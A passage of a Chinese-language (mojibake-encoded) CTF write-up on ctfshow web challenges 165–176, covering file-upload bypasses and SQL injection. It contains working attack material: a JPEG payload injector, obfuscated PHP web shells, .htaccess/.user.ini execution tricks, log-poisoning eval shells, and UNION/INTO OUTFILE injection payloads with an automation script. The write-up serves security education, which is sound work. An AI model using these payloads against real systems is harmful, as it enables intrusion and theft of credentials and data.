class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹<code>å›½å…‰</code>å¸ˆå‚…çš„å›¾ç‰‡ï¼Œç„¶åæµç¨‹å‚è€ƒäº†<a href="https://www.wlhhlc.top/posts/14827/#web165">dota_st</a>å¸ˆå‚…çš„åšå®¢ï¼Œè¦å…ˆä¸Šä¼ ä¸€éåŸå›¾<code>1.jpg</code>ï¼Œç„¶åç‚¹å‡»æŸ¥çœ‹å¹¶æŠŠå›¾ç‰‡ä¸‹è½½ä¸‹æ¥å¹¶å‘½åä¸º<code>2.jpg</code>ï¼Œç´§æ¥ç€ç”¨è„šæœ¬å»ç”Ÿæˆ<code>payload_2.jpg</code>ï¼Œæœ€åä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="https://cdnjson.com/images/2023/02/08/web165.jpg" alt="web165.jpg"></p><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>æºç ä¸­å‘ç°åªèƒ½ä¼ <code>zip</code>æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">id</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">lay-data</span>=<span class="string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;images&#x27;,exts:&#x27;zip&#x27;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ä¼ ğŸç„¶åå‘åŒ…è®¿é—®å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.zip&quot;</span><br><span class="line">Content-Type: application/x-zip-compressed</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;cat ../flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>æç¤º<code>httpd</code>ï¼Œæ‰€ä»¥æƒ³åˆ°<code>.htaccess</code>ç»•è¿‡</p><blockquote><p>è¿™é‡Œç®€å•ä»‹ç»å‡ ä¸ªç”¨æ³•</p><ol><li><p>å°†.pngåç¼€çš„æ–‡ä»¶è§£ææˆphp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li><li><p>åŠŸèƒ½åŒ<code>1</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li><p>å½“å‰æ‰€æœ‰ç±»å‹æ–‡ä»¶è§£æä¸ºphp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php </span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœflagä¸æ˜¯phpæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥åƒ.user.iniä¸€æ ·åœ¨å½“å‰ç›®å½•åŠ è½½ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file &#x27;flag&#x27;</span><br></pre></td></tr></table></figure></li></ol></blockquote><p>ä¸Šä¼ å®Œ<code>.htaccess</code>æ–‡ä»¶åä¸Šä¼ å›¾ç‰‡ğŸè®¿é—®æ‰§è¡Œå‘½ä»¤å³å¯</p><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>æç¤º<code>åŸºç¡€å…æ€</code></p><blockquote><p>ç½‘ä¸Šæ‰¾äº†å‡ ä¸ª</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ä»»é€‰ä¸€ä¸ªä¸Šä¼ ï¼Œè®°å¾—ä¿®æ”¹åç¼€ä¸º<code>.php</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/test.php</span><br><span class="line">POST:</span><br><span class="line">1=tac ../flagaa.php</span><br></pre></td></tr></table></figure><h2 id="web169-170"><a href="#web169-170" class="headerlink" title="web169-170"></a>web169-170</h2><p>å‘ç°æ­£å¸¸ä¸Šä¼ <code>php</code>æ–‡ä»¶å†…å®¹ç§åŒ…å«<code>&lt;</code>å°±ä¸è¡Œï¼Œæ‰€ä»¥è€ƒè™‘æ—¥å¿—åŒ…å«(<code>php://input</code>å°è¯•åå‘ç°ä¸è¡Œ)ï¼Œå› ä¸ºç›®å½•ä¸‹æ²¡æœ‰<code>php</code>æ–‡ä»¶æ‰€ä»¥å…ˆä¼ ä¸ª<code>index.php</code>ä¸Šå»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">evo1ution</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ <code>.user.ini</code>åŒ…å«æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹<code>UA</code>ä¸º<code>&lt;?php eval($_POST[1]);?&gt;</code>ï¼Œéšåè®¿é—®æ‰§è¡Œå‘½ä»¤å³å¯ï¼ˆä½¿ç”¨<code>phpinfo</code>å¯ä»¥å¸®åŠ©å®šä½ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">1=system(&#x27;tac ../flagaa.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åé¢çš„å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or id = &#x27;26</span><br></pre></td></tr></table></figure><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è”åˆæŸ¥è¯¢å¹¶ä¸”<code>username</code>ä¸èƒ½æ˜¯<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; UNION SELECT id,password from ctfshow_user2 where username = &#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¢æˆ3åˆ—å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; UNION SELECT id,2,password from ctfshow_user3 where username = &#x27;flag</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å¯¹åˆ—åå­—è¿›è¡Œ<code>hex</code>å¤„ç†ï¼ˆå…¶ä»–ç¼–ç ä¹Ÿå¯<code>to_base64</code>ï¼Œä¹Ÿå¯ä»¥æˆªæ–­<code>substr</code>æˆ–è€…é€†å‘<code>reverse</code>è¾“å‡ºï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27; UNION SELECT id,hex(username),password from ctfshow_user3 where username = &#x27;</span>flag</span><br></pre></td></tr></table></figure><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>flag</code>å’Œæ•°å­—ï¼Œè€ƒè™‘æŠŠæ‰€æœ‰æ•°å­—æ›¿æ¢æ‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://41c95c0c-b709-4515-8f36-a3dc76110439.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">a1=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">a2=[<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">payload = <span class="string">&quot;replace(&quot;</span> + payload + <span class="string">&quot;,&#123;&#125;,&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(a1[i], a2[i])</span><br><span class="line">payload = <span class="string">&quot;-1&#x27; union select &#x27;a&#x27;,&quot;</span> + payload + <span class="string">&quot; from ctfshow_user4 where username = &#x27;flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">response = requests.get(url=url+payload)</span><br><span class="line">res = re.findall(<span class="string">r&#x27;ctfshow&#123;.*?&#125;&#x27;</span>,response.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> res:</span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> a2:</span><br><span class="line">flag += <span class="built_in">str</span>(a1[a2.index(c)])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += c</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†asciiç ä»1~127çš„å­—ç¬¦ï¼Œæµ‹è¯•å‘ç°ç”¨ä¸­æ–‡å­—ç¬¦ä¸è¡Œï¼Œå› ä¸ºè¿”å›çš„jsonæ ¼å¼ä»ä¼šè¢«æ£€æµ‹åˆ°ï¼Œæ•…é€‰æ‹©ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨ğŸ(æ³¨æ„åˆ—æ•°ï¼Œè¿™é‡Œæ˜¯2åˆ—)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>å»çœ‹æ•°æ®åº“é…ç½®å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/1.php</span><br><span class="line">POSTï¼š</span><br><span class="line">1=system(&#x27;cat ./api/config.php&#x27;);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> =<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctfshow_web&quot;</span>;</span><br><span class="line"><span class="variable">$charName</span> = <span class="string">&quot;utf-8&quot;</span>; </span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥ï¼Œå³é”®é€‰æ‹©æ•°æ®æ“ä½œï¼Œé…ç½®å‚æ•°ï¼ˆæ•°æ®åº“ç±»å‹é€‰æ‹©<code>MYSQLI</code>ï¼‰ï¼Œè¿æ¥ååœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°<code>flag</code></p><p><img src="https://cdnjson.com/images/2023/02/08/web175.png" alt="web175.png"></p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 